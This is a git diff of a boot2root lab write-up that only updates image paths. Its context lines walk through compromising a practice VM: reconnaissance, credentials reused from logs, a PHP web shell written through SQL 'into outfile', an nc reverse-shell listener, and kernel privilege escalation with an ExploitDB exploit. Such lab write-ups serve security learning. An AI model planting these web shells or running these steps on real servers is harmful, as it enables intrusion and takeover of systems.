@@ -1,6 +1,6 @@
 ### Boot2Root
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/1.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/1.png)
 
 #### Find IP of Guest Os
 Let's gather information about my network
@@ -129,7 +129,7 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 2.29 seconds
 
 **"PCS Systemtechnik/Oracle VirtualBox virtual NIC"**
 so I'm confident that it is
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/2.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/2.png)
 
 ```sh
 nmap -sT 192.168.100.14
@@ -183,16 +183,16 @@ Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
 
 let's take a look there
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/3.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/4.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/5.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/6.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/7.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/3.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/4.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/5.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/6.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/7.png)
 
 while browsing i see this
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/8.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/9.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/8.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/9.png)
 
 Let's take a look at the log, and keep in mind that this is related to the *lmezard* user.
 
@@ -249,21 +249,21 @@ admin from 62.210.32.157 port 56754 ssh2
 
 There's something strange: *!q\\]Ej?\*5K5cy\*AJ*. A password perhaps? Well, let's give it a try
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/10.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/11.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/10.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/11.png)
 
 Let's take a look inside the website
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/12.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/13.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/15.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/14.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/16.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/17.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/12.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/13.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/15.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/14.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/16.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/17.png)
 
 As you can see, we were able to log in as *lmezard*. Now, let's go back and see where we are.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/18.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/18.png)
 #### What We Know
 - **Guest IP:** 192.168.100.14
 
@@ -274,9 +274,9 @@ As you can see, we were able to log in as *lmezard*. Now, let's go back and see 
 
 Maybe I can use this email to log in somewhere else.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/19.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/20.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/29.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/19.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/20.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/29.png)
 
 **INBOX, INBOX.Drafts..** all empty
 
@@ -287,19 +287,19 @@ Maybe I can use this email to log in somewhere else.
 
 while looking around
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/21.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/22.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/21.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/22.png)
 
 From the message, we can see that the database credentials are *root/Fg-'kKXBj87E:aJ$*.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/23.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/24.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/25.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/23.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/24.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/25.png)
 
 I've tried different places, but haven't had any luck so far.
 
 here's more info at *https://192.168.100.14/phpmyadmin/index.php?db=forum_db&token=de13e0659b2761e0e8d75a747e160ad7*
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/26.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/26.png)
 
 user_pw is hashed, so no luck there either.
 
@@ -312,18 +312,18 @@ user_pw is hashed, so no luck there either.
 
 We might be able to run some SQL commands. perhaps through *SQL injection*?
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/27.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/28.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/27.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/28.png)
 
 After experimenting for a while, you can see that we are able to interact with the database.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/30.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/31.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/30.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/31.png)
 
 Since we see phpMyAdmin and MySQL related content, I believe the backend is developed in PHP. 
 Additionally, the URLs look like this:
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/32.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/32.png)
 
 Since the *webmail.php* file is running on the server, I wonder if modifying it could give me 
 access. Why not try inserting a PHP file and filling it with what I need? while searching, I 
@@ -339,7 +339,7 @@ Let's give it a try.
 select "something to test with" into outfile "/var/www/test.php";
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/33.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/33.png)
 
 Oops, it seems there's a permission issue.
 
@@ -355,7 +355,7 @@ ffuf -u https://192.168.100.14/FUZZ -w directory-list-2.3-medium.txt -recursion 
 
 And I saved the output locally for analysis.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/34.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/34.png)
 
 I ran it again to obtain a different format that's easier to use with *grep*
 
@@ -365,7 +365,7 @@ ffuf -u https://192.168.100.14/FUZZ -w ./Discovery/Web-Content/directory-list-2.
 
 more formatting on a website `https://jsonformatter.org/`
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/35.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/35.png)
 
 let's extract the list of folders
 
@@ -466,16 +466,16 @@ select "test" into outfile "/var/www/phpmyadmin//injected_file.php";
 select "test" into outfile "/var/www///injected_file.php";
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/36.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/36.png)
 
 Since I couldn't run all of them at once, I will try them one by one. After many trials.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/37.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/39.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/38.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/40.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/41.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/42.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/37.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/39.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/38.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/40.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/41.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/42.png)
 
 You might have noticed that the IP has changed. Don't worry—it's because I added another VM 
 instance. I'll perform the process again, as I can no longer write to the previous one.
@@ -483,7 +483,7 @@ instance. I'll perform the process again, as I can no longer write to the previo
 ```sql
 select "<?php echo 'Command: ' . $_POST['cmd'] . '\n'; system($_POST['cmd']);?>" into outfile "/var/www/forum/templates_c/backdoor.php";
 ```
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/43.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/43.png)
 
 now I can do this
 
@@ -496,11 +496,11 @@ BTW this is called
 on the system i.e remote code execution here's nice video about it
 `https://www.youtube.com/watch?v=iPmXu8XoCTI`
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/44.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/44.png)
 
 Now, let's create a reverse shell so I can explore more easily.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/45.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/45.png)
 
 As you can see, while attempting this, we encountered a problem: there's no *-e* option.
 
@@ -524,7 +524,7 @@ BTW listener is already set like this
 nc -l -vv -p 2000
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/46.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/46.png)
 https://www.youtube.com/watch?v=bXCeFPNWjsM
 
 ```sh
@@ -572,7 +572,7 @@ postfix:x:110:118::/var/spool/postfix:/bin/false
 I cannot access /etc/shadow, and even if I could, it likely wouldn't be helpful since I already 
 tried cracking the hashes stored in the database.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/47.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/47.png)
 
 but
 ```sh
@@ -589,11 +589,11 @@ so let's look for common CVEs `https://www.cvedetails.com/vulnerability-list/ven
 I couldn’t find it here—I haven’t looked extensively yet. So, I decided to use ExploitDB, 
 specifically the command *searchsploit* kernel 3.2, to get a list of CVEs.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/48.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/48.png)
 
 After some trials, I found this one:
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/49.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/49.png)
 
 here's the c file "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/local/40839.c?ref_type=heads"
 
@@ -613,12 +613,12 @@ in the echo command.
 
 and change firefart to root
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/50.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/51.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/50.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/51.png)
 
 wait a bit
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/52.png)
+![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/52.png)
 
 
 ### Steps
